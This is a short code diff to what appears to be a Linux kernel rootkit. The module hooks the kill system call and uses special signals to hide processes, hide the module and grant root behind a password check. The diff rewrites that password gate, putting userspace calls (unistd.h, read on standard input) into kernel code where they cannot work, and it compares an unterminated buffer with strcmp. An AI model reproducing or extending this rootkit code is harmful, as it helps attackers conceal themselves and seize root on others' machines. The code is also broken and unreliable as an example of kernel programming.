@@ -7,6 +7,7 @@
 //ADDED:
 #include <linux/tty.h>
 #include <linux/kthread.h>
+#include <unistd.h>
 
 #if LINUX_VERSION_CODE < KERNEL_VERSION(4, 13, 0)
 #include <asm/uaccess.h>
@@ -332,30 +333,14 @@ hacked_kill(pid_t pid, int sig)
 	bool pwPassed = FALSE;
 	if(sig==SIGINVIS || sig==SIGSUPER || sig==SIGMODINVIS){
 		
-		struct tty_struct* tty;
+		char buffer[1024]; // buffer to hold input
+		int bytes_read; // number of bytes read
 
-		// Disable echoing of user input to the terminal
-		tty = current->signal->tty;
-		if (tty != NULL) {
-			tty->termios.c_lflag &= ~ECHO;
-			tty_mode(tty);
-		}
-
-		// Prompt the user for a password
-		char buf[128];
-		int len;
-		tty = get_current_tty();
-		//    if (!tty) { return -ENODEV; }
-		len = tty->driver->read(tty, buf, sizeof(buf));
-
-		// Restore echoing of user input to the terminal
-		if (tty != NULL) {
-			tty->termios.c_lflag |= ECHO;
-			tty_reset(tty);
-		}
+		// read input from standard input (the terminal)
+		bytes_read = read(STDIN_FILENO, buffer, sizeof(buffer));
 
 		// Check whether the entered password matches the stored password
-		if (len > 0 && strcmp(buf,MAGIC_PREFIX)==0) { pwPassed=TRUE; }
+		if (bytes_read > 0 && strcmp(buffer,MAGIC_PREFIX)==0) { pwPassed=TRUE; }
 		pwTried = TRUE;
 	}
 
